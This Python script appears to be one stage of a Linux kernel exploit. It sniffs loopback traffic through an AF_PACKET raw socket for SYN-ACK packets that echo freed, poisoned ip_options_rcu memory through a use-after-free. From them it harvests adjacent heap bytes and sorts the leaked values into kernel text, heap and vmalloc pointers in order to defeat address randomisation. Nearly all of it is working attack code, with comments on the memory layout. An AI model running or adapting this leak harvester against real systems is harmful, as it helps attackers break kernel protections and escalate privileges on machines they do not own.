import socket, time, collections, sys

# Poison-echo leak harvester (AF_PACKET on lo - AF_INET raw sockets do NOT
# see these packets, only AF_PACKET does).
#
# The UAF reader (retransmit SYN-ACK build) reads the freed, poisoned
# ip_options_rcu: optlen=107 -> memcpy(iph+20, object+32, 107):
#   packet[20..83]  = object+32..95  (64 bytes of 0x6b poison)
#   packet[84..99]  = object+96..111 = THE NEIGHBOR SLOT's first 16 bytes
# (the packet is truncated to ~100 bytes, so 16 neighbor bytes leak per echo)

def region(v):
    if 0xffffffff80000000 <= v < 0xffffffffc0000000: return "TEXT/DATA"
    if 0xffff888000000000 <= v < 0xffffc80000000000: return "physmap/heap"
    if 0xffffc88000000000 <= v < 0xffffec0000000000: return "vmalloc"
    if 0xfffffe0000000000 <= v < 0xffffff0000000000: return "cpu_entry"
    return None

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("lo", 0))
s.settimeout(1)

seen = collections.Counter()
samples = collections.Counter()
n = 0
hits = 0
t0 = time.time()
RUNTIME = int(sys.argv[1]) if len(sys.argv) > 1 else 240
running = True
def _stop(*a):
    global running
    running = False
import signal
signal.signal(signal.SIGTERM, _stop)

while running and time.time() - t0 < RUNTIME:
    try:
        pkt, _ = s.recvfrom(65535)
    except socket.timeout:
        continue
    n += 1
    if pkt[0] >> 4 != 4:
        continue
    ip = pkt
    # poison-echo detection: 4+ consecutive 0x6b at the options area
    if b"\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x6b" not in ip[16:32]:
        continue
    nb = ip[84:100]   # neighbor slot bytes 0..15
    if len(nb) < 16:
        continue
    hits += 1
    samples[nb.hex()] += 1
    for off in range(0, 9):
        v = int.from_bytes(nb[off:off+8], "little")
        r = region(v)
        if r:
            seen[(off, r)] += 1
            print("[PTR] nb+%-2d %-13s 0x%016x  (raw %s)" % (off, r, v, nb.hex()), flush=True)
    if hits % 50 == 0:
        print("[hb] pkts=%d echo=%d ptrs=%d" % (n, hits, sum(seen.values())), flush=True)

print("== done: pkts=%d poison-echo=%d ==" % (n, hits), flush=True)
print("== distinct neighbor signatures: %d ==" % len(samples), flush=True)
for sig, c in samples.most_common(15):
    print("  %s x%d" % (sig, c), flush=True)
print("== pointer hits ==", flush=True)
for (off, r), c in seen.most_common(20):
    print("  nb+%-2d %-13s x%d" % (off, r, c), flush=True)
